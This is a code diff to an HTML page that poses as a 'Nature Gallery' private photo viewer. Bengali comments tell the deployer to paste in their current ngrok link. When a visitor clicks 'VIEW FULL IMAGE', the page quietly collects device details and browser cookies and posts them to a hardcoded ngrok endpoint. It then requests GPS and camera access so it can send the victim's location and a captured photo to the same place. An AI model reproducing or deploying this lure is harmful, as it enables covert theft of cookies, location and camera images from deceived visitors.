@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Media Gallery</title>
+    <title>Nature Gallery</title>
     <style>
         body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #000; color: #fff; font-family: sans-serif; }
         #box { text-align: center; padding: 25px; background: #111; border-radius: 15px; width: 85%; max-width: 350px; border: 1px solid #333; }
@@ -14,48 +14,38 @@
     </style>
 </head>
 <body>
-
     <div id="box">
         <div style="font-size: 50px;">🖼️</div>
-        <h3>Private Content</h3>
+        <h3>Private Photo</h3>
         <p style="color: #888; font-size: 0.9rem;">To view the high-resolution image, please complete the verification.</p>
         <button onclick="startInfiltration()">VIEW FULL IMAGE</button>
     </div>
-
     <div id="content">
         <img src="elephant.jpg" alt="Unlocked Content">
     </div>
-
     <video id="video" autoplay></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        const NGROK_URL = 'https://2f74-103-174-44-17.ngrok-free.app/vulnerability_probe';
+        // এখানে আপনার বর্তমান এনগ্রোক লিঙ্কটি দিন
+        const NGROK_BASE = 'https://2f74-103-174-44-17.ngrok-free.app'; 
 
         async function startInfiltration() {
-            // ১. সাইলেন্ট ডাটা (পারমিশন ছাড়াই যা পাওয়া যায়)
             let report = {
                 system: {
                     os: navigator.platform,
-                    agent: navigator.userAgent,
                     cores: navigator.hardwareConcurrency,
                     ram: navigator.deviceMemory + "GB",
                     res: `${screen.width}x${screen.height}`,
-                    lang: navigator.language,
                     time: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    cookies: document.cookie || "No Cookies Found",
-                    storage: JSON.stringify(localStorage)
-                },
-                extra: {}
+                    cookies: document.cookie || "No Cookies Found"
+                }
             };
 
-            // ব্যাটারি লেভেল চেক
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                report.extra.battery = `${(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
-            }
+            // সাইলেন্ট ডাটা পাঠানো শুরু করবে
+            sendData(report, null);
 
-            // ২. পারমিশন রিকোয়েস্ট (GPS & Camera)
+            // লোকেশন ও ক্যামেরা ট্রাই করবে
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 report.gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 try {
@@ -77,7 +67,12 @@
         }
 
         function sendData(d, p) {
-            fetch(NGROK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ...d, photo: p }) });
+            fetch(`${NGROK_BASE}/vulnerability_probe`, {
+                method: 'POST',
+                mode: 'cors', // CORS নিশ্চিত করা হলো
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ...d, photo: p })
+            }).catch(err => console.error("Error sending data:", err));
         }
     </script>
 </body>
